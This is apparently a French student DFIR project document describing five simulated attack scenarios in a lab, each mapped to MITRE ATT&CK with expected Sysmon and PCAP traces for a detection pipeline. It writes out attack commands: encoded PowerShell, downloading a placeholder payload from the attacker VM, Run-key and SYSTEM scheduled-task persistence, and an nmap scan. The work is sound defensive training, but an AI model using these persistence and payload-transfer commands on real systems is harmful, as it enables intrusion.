# Scénarios d'attaque — PFA DFIR

Ce document décrit les 5 scénarios d'attaque simulés pour générer les logs Sysmon (.xml) et le trafic réseau (.pcap) utilisés par le pipeline de corrélation.

Environnement : VM Windows (victime, Sysmon + config SwiftOnSecurity) — VM Kali (attaquant) — VM Ubuntu (SOC : Elasticsearch + Kibana + Python).

### Adresses IP du lab

| Machine | Rôle | IP |
|---|---|---|
| Windows | Victime | 10.0.3.4 |
| Kali | Attaquant | 10.0.3.5 |

---

## Scénario 1 — PowerShell encodé

**Tactique MITRE ATT&CK** : Execution
**Technique** : T1059.001 (Command and Scripting Interpreter: PowerShell)
**Machine** : Windows

### Commande exécutée

```powershell
$cmd = "Write-Output 'test malveillant simule'"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encoded
```

### Objectif du scénario

Simuler l'obfuscation d'une commande malveillante en Base64, une technique très répandue pour échapper à une détection basée sur des mots-clés en clair.

### Traces attendues

| Source | Détail |
|---|---|
| Sysmon | Event ID 1 (process creation) |
| Champ clé | `CommandLine` contient `-EncodedCommand` suivi d'une chaîne Base64 |
| PCAP | Aucune (attaque purement locale) |

### Indicateur de suspicion

Présence du mot-clé `-EncodedCommand` dans la ligne de commande d'un processus `powershell.exe`.

---

## Scénario 2 — Téléchargement de fichier depuis Kali

**Tactique MITRE ATT&CK** : Command and Control
**Technique** : T1105 (Ingress Tool Transfer)
**Machines** : Kali (serveur) → Windows (client)

### Commandes exécutées

Sur Kali :
```bash
echo "faux payload" > payload.exe
python3 -m http.server 8000
```

Sur Windows :
```powershell
Invoke-WebRequest -Uri http://10.0.3.5:8000/payload.exe -OutFile C:\Users\Public\payload.exe
```

### Objectif du scénario

Simuler le téléchargement d'un outil/malware supplémentaire depuis une infrastructure contrôlée par l'attaquant, une étape courante après un accès initial.

### Traces attendues

| Source | Détail |
|---|---|
| Sysmon | Event ID 3 (network connection) — `Image=powershell.exe`, `DestinationIp`, `DestinationPort=8000` |
| Sysmon | Event ID 11 (file create) — `TargetFilename=C:\Users\Public\payload.exe` |
| PCAP | Requête HTTP GET `/payload.exe` et réponse du serveur Kali |

### Indicateur de suspicion

Fichier exécutable créé dans un dossier public (`C:\Users\Public`) immédiatement après une connexion réseau sortante du même processus (corrélation par PID + proximité temporelle).

---

## Scénario 3 — Persistance via clé de registre Run

**Tactique MITRE ATT&CK** : Persistence
**Technique** : T1547.001 (Registry Run Keys / Startup Folder)
**Machine** : Windows

### Commande exécutée

```powershell
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateCheck" -Value "C:\Users\Public\payload.exe" -PropertyType String
```

### Objectif du scénario

Simuler la mise en place d'une persistance simple : le programme référencé se relance automatiquement à chaque ouverture de session de l'utilisateur.

### Traces attendues

| Source | Détail |
|---|---|
| Sysmon | Event ID 13 (registry value set) |
| Champ clé | `TargetObject` contient `...\Run\UpdateCheck`, `Details=C:\Users\Public\payload.exe` |
| PCAP | Aucune |

### Indicateur de suspicion

Valeur de registre créée par un processus `powershell.exe` (plutôt qu'un vrai installeur), nom générique imitant une mise à jour légitime, pointant vers un exécutable situé dans un dossier inhabituel.

---

## Scénario 4 — Persistance via tâche planifiée

**Tactique MITRE ATT&CK** : Persistence
**Technique** : T1053.005 (Scheduled Task)
**Machine** : Windows

### Commande exécutée

```powershell
schtasks /create /tn "SystemUpdate" /tr "C:\Users\Public\payload.exe" /sc onlogon /ru System
```

### Objectif du scénario

Simuler une persistance alternative offrant plus de flexibilité (déclencheurs variés) et une possible élévation de privilège via l'exécution sous le compte SYSTEM.

### Traces attendues

| Source | Détail |
|---|---|
| Sysmon | Event ID 1 (process creation) — `Image=schtasks.exe` |
| Champ clé | `CommandLine` contient `/tn "SystemUpdate"`, `/ru System` |
| PCAP | Aucune |

### Indicateur de suspicion

Création d'une tâche planifiée s'exécutant avec les privilèges SYSTEM depuis un contexte utilisateur standard.

---

## Scénario 5 — Scan réseau (Nmap)

**Tactique MITRE ATT&CK** : Discovery
**Technique** : T1046 (Network Service Discovery)
**Machine** : Kali → Windows

### Commande exécutée

```bash
nmap -sV -p 1-1000 10.0.3.4
```

### Objectif du scénario

Simuler la phase de reconnaissance réseau menée par un attaquant pour cartographier les services actifs sur la machine cible.

### Traces attendues

| Source | Détail |
|---|---|
| Sysmon | Aucune (activité générée depuis l'extérieur, pas de processus local sur Windows) |
| PCAP | Grand nombre de paquets courts (SYN/RST) depuis l'IP de Kali vers de nombreux ports différents de la VM Windows, en peu de temps |

### Indicateur de suspicion

Volume anormal de connexions courtes vers des ports variés depuis une même source, en une fenêtre de temps réduite — pattern caractéristique d'un scan de ports.

### Remarque pédagogique

Ce scénario est le seul entièrement invisible côté Sysmon : il illustre l'intérêt de corréler les logs système et le trafic réseau plutôt que de se fier à une seule source de données.

---

## Récapitulatif

| # | Scénario | Tactique | Technique | Sysmon Event ID | Visible en PCAP |
|---|---|---|---|---|---|
| 1 | PowerShell encodé | Execution | T1059.001 | 1 | Non |
| 2 | Téléchargement payload | Command and Control | T1105 | 3, 11 | Oui |
| 3 | Persistance Run key | Persistence | T1547.001 | 13 | Non |
| 4 | Persistance tâche planifiée | Persistence | T1053.005 | 1 | Non |
| 5 | Scan Nmap | Discovery | T1046 | — | Oui |

## Ordre d'exécution recommandé pour la démonstration

1. Démarrer la capture Wireshark et vérifier que Sysmon tourne
2. Scénario 5 (reconnaissance)
3. Scénario 1 (exécution)
4. Scénario 2 (command and control)
5. Scénario 3 puis 4 (persistance)
6. Arrêter la capture, exporter les logs Sysmon (.xml) et le PCAP (.pcap)

Cet enchaînement reconstitue une chaîne d'attaque cohérente (reconnaissance → exécution → command and control → persistance) que le moteur de corrélation devra reconstruire automatiquement à partir des fichiers de logs.
